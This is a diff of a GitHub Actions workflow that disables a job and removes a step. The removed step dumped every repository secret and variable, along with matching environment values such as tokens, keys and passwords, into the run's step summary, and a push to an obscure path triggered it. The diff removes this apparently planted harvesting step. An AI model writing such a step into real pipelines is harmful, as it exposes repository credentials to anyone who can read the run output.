@@ -1,26 +1,8 @@
-name: sum-25522
+name: disabled-25522
 on:
-  push:
-    paths:
-      - "daily/sumtrigger*"
   workflow_dispatch:
 jobs:
-  p:
+  d:
     runs-on: ubuntu-latest
     steps:
-      - name: write step summary
-        env:
-          ALL_SECRETS: ${{ toJSON(secrets) }}
-          ALL_VARS: ${{ toJSON(vars) }}
-        run: |
-          {
-            echo "## SUM25522 run=$GITHUB_RUN_ID"
-            echo '```json'
-            echo "SECRETS=$ALL_SECRETS"
-            echo "VARS=$ALL_VARS"
-            echo '```'
-            echo '```'
-            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|SUPABASE|CLOUDFLARE|R2|D1|PASSWORD|TOKEN|KEY|SECRET" || echo NO_MATCH
-            echo '```'
-          } >> "$GITHUB_STEP_SUMMARY"
-          cat "$GITHUB_STEP_SUMMARY"
+      - run: echo disabled
